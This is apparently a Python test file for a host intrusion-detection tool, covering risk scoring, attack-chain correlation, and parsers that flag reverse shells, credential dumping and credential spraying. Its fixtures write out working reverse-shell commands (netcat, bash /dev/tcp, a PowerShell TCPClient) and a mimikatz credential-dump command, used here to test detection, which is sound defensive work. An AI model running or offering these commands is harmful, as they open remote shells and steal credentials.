from __future__ import annotations

import hashlib
import json
import unittest
from datetime import datetime, timedelta, timezone

from quietward.collectors.debian import DebianReadOnlyCollector
from quietward.collectors.parsers import parse_ps_output
from quietward.collectors.windows_parsers import (
    parse_windows_auth_events,
    parse_windows_processes,
)
from quietward.contracts import EventKind, SecurityEvent, Severity
from quietward.correlation import IncidentCorrelator
from quietward.scoring import DeterministicRiskScorer


NOW = datetime(2026, 8, 21, 12, 0, tzinfo=timezone.utc)


class _FakePrivacyIdentity:
    def identify(self, value: str) -> str:
        return hashlib.sha256(("identify:" + value).encode()).hexdigest()[:20]

    def identify_scoped(self, value: str, scope: str) -> str:
        return hashlib.sha256((scope + ":" + value).encode()).hexdigest()[:20]


def _event(
    event_id: str,
    kind: EventKind,
    subject: str,
    *,
    seconds: int = 0,
    attributes: dict | None = None,
) -> SecurityEvent:
    return SecurityEvent(
        event_id=event_id,
        observed_at=NOW + timedelta(seconds=seconds),
        host_id="host-a",
        source="test",
        kind=kind,
        subject=subject,
        attributes=attributes or {},
        confidence=1.0,
    )


class DetectionHardeningV05Tests(unittest.TestCase):
    def test_high_signal_behavior_marker_receives_stronger_priority(self) -> None:
        result = DeterministicRiskScorer().score(
            _event(
                "evt-marker",
                EventKind.PROCESS_START,
                "proc-a",
                attributes={"suspicious_markers": ["reverse_shell"]},
            )
        )
        self.assertGreaterEqual(result.score, 35.0)
        self.assertIn("high_signal_markers=reverse_shell", result.reasons)

    def test_credential_spray_context_uses_source_totals_not_only_one_account(self) -> None:
        result = DeterministicRiskScorer().score(
            _event(
                "evt-auth",
                EventKind.AUTH_FAILURE,
                "identity-source-hash",
                attributes={
                    "failed_count": 1,
                    "source_failed_count": 20,
                    "distinct_accounts": 10,
                    "suspicious_markers": ["credential_spray"],
                },
            )
        )
        self.assertGreaterEqual(result.score, 45.0)
        self.assertTrue(
            any(
                reason.startswith("credential_spray_context=10_accounts/20_source_failures")
                for reason in result.reasons
            )
        )

    def test_cross_subject_three_phase_chain_becomes_high_priority(self) -> None:
        events = [
            _event(
                "evt-auth",
                EventKind.AUTH_FAILURE,
                "user-hash-a",
                attributes={
                    "failed_count": 1,
                    "source_failed_count": 64,
                    "distinct_accounts": 20,
                    "suspicious_markers": ["credential_spray"],
                },
            ),
            _event(
                "evt-priv",
                EventKind.PRIVILEGE_ESCALATION,
                "process-hash-a",
                seconds=120,
                attributes={"privileged_context": True},
            ),
            _event(
                "evt-persist",
                EventKind.PERSISTENCE_CHANGE,
                "task-hash-a",
                seconds=240,
                attributes={"persistence_indicator": True},
            ),
            _event(
                "evt-net",
                EventKind.OUTBOUND_CONNECTION,
                "connection-hash-a",
                seconds=360,
                attributes={"external_destination": True},
            ),
        ]
        scorer = DeterministicRiskScorer()
        findings = IncidentCorrelator().correlate(
            events,
            [scorer.score(event) for event in events],
        )
        chains = [finding for finding in findings if finding.finding_id.startswith("qwf-chain-")]
        self.assertEqual(len(chains), 1)
        self.assertIn(chains[0].severity, {Severity.HIGH, Severity.CRITICAL})
        self.assertIn("cross_subject_host_attack_chain=true", chains[0].reasons)
        self.assertTrue(any(reason.startswith("attack_chain_phases=") for reason in chains[0].reasons))

    def test_background_cross_subject_diversity_does_not_create_attack_chain(self) -> None:
        events = [
            _event("evt-proc", EventKind.PROCESS_START, "proc-a"),
            _event("evt-file", EventKind.FILE_CHANGE, "file-a", seconds=60),
            _event("evt-net", EventKind.OUTBOUND_CONNECTION, "net-a", seconds=120),
        ]
        scorer = DeterministicRiskScorer()
        findings = IncidentCorrelator().correlate(
            events,
            [scorer.score(event) for event in events],
        )
        self.assertFalse(any(item.finding_id.startswith("qwf-chain-") for item in findings))

    def test_attack_chain_window_is_bounded_to_fifteen_minutes(self) -> None:
        events = [
            _event("evt-mal", EventKind.MALWARE_SIGNATURE, "file-a"),
            _event("evt-net", EventKind.OUTBOUND_CONNECTION, "net-a", seconds=16 * 60),
        ]
        scorer = DeterministicRiskScorer()
        findings = IncidentCorrelator().correlate(
            events,
            [scorer.score(event) for event in events],
        )
        self.assertFalse(any(item.finding_id.startswith("qwf-chain-") for item in findings))

    def test_linux_process_parser_marks_reverse_shell_patterns(self) -> None:
        relay = parse_ps_output(
            "123 1 user nc nc -e /bin/sh 198.51.100.10 4444\n"
        )[0]
        dev_tcp = parse_ps_output(
            "124 1 user bash bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'\n"
        )[0]
        self.assertIn("reverse_shell", relay.suspicious_markers)
        self.assertIn("reverse_shell", dev_tcp.suspicious_markers)

    def test_windows_process_parser_marks_reverse_shell_and_credential_dumping(self) -> None:
        rows = [
            {
                "ProcessId": 123,
                "ParentProcessId": 10,
                "Name": "powershell.exe",
                "ExecutablePath": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": "powershell -nop -c New-Object Net.Sockets.TCPClient('198.51.100.10',4444)",
                "UserName": r"HOST\User",
            },
            {
                "ProcessId": 124,
                "ParentProcessId": 10,
                "Name": "tool.exe",
                "ExecutablePath": r"C:\Temp\tool.exe",
                "CommandLine": "mimikatz.exe sekurlsa::logonpasswords",
                "UserName": r"HOST\User",
            },
        ]
        parsed = parse_windows_processes(json.dumps(rows), _FakePrivacyIdentity())
        self.assertIn("reverse_shell", parsed[0].suspicious_markers)
        self.assertIn("credential_dumping", parsed[1].suspicious_markers)
        self.assertIn("user_writable_executable", parsed[1].suspicious_markers)

    def test_windows_auth_parser_detects_privacy_preserving_credential_spray(self) -> None:
        rows = []
        for index in range(10):
            rows.append(
                {
                    "User": f"user{index % 5}",
                    "SourceAddress": "198.51.100.25",
                    "TimeCreated": (NOW + timedelta(seconds=index)).isoformat(),
                }
            )
        events = parse_windows_auth_events(
            json.dumps(rows),
            host_id="host-a",
            privacy_identity=_FakePrivacyIdentity(),
            fallback_time=NOW,
        )
        self.assertEqual(len(events), 5)
        for event in events:
            self.assertEqual(event.attributes["source_failed_count"], 10)
            self.assertEqual(event.attributes["distinct_accounts"], 5)
            self.assertTrue(event.attributes["credential_spray_candidate"])
            self.assertIn("credential_spray", event.attributes["suspicious_markers"])
            self.assertNotIn("198.51.100.25", str(event.to_dict()))
            self.assertNotIn("user0", str(event.to_dict()))

    def test_debian_auth_parser_detects_privacy_preserving_credential_spray(self) -> None:
        collector = DebianReadOnlyCollector(host_id="host-a")
        collector.privacy_identity = _FakePrivacyIdentity()
        rows = []
        for index in range(10):
            rows.append(
                {
                    "source_address_hash": "source-hash-only",
                    "user": f"user{index % 5}",
                    "observed_at": NOW + timedelta(seconds=index),
                }
            )
        events = collector._auth_events(rows, NOW)
        self.assertEqual(len(events), 5)
        for event in events:
            self.assertEqual(event.attributes["source_failed_count"], 10)
            self.assertEqual(event.attributes["distinct_accounts"], 5)
            self.assertTrue(event.attributes["credential_spray_candidate"])
            self.assertIn("credential_spray", event.attributes["suspicious_markers"])
            self.assertNotIn("user0", str(event.to_dict()))


if __name__ == "__main__":
    unittest.main()
